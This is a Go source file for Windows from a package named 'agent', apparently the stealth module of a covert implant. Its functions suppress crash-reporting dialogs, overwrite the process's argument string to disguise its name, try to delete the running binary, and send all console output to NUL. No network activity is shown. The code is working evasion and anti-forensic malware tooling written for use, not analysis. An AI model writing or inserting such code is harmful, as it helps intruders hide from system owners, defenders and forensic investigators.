//go:build windows

package agent

import (
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

func disableCoreDumps() {
	// Suppress Windows Error Reporting dialogs and crash popups.
	const (
		SEM_FAILCRITICALERRORS     = 0x0001
		SEM_NOGPFAULTERRORBOX      = 0x0002
		SEM_NOOPENFILEERRORBOX     = 0x8000
	)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setErrorMode := kernel32.NewProc("SetErrorMode")
	setErrorMode.Call(uintptr(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX)) //nolint:errcheck
}

func masqueradeProcess(name string) {
	if name == "" {
		return
	}
	// Overwrite os.Args[0] bytes in place. This masks /proc-equivalent
	// inspection; the Windows process name comes from the executable
	// filename, so this is best-effort.
	if len(os.Args) > 0 {
		arg0 := os.Args[0]
		ptr := unsafe.Pointer(unsafe.StringData(arg0))
		buf := unsafe.Slice((*byte)(ptr), len(arg0))
		n := copy(buf, name)
		for i := n; i < len(buf); i++ {
			buf[i] = ' '
		}
	}
}

func selfDeleteBinary() {
	// Best-effort: on Windows the running binary is locked, so this will
	// usually fail. We attempt it anyway for completeness.
	if len(os.Args) > 0 {
		_ = os.Remove(os.Args[0])
	}
}

func silenceOutput() {
	nul, err := os.OpenFile("NUL", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	fd := nul.Fd()
	_ = windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, windows.Handle(fd))
	_ = windows.SetStdHandle(windows.STD_ERROR_HANDLE, windows.Handle(fd))
}
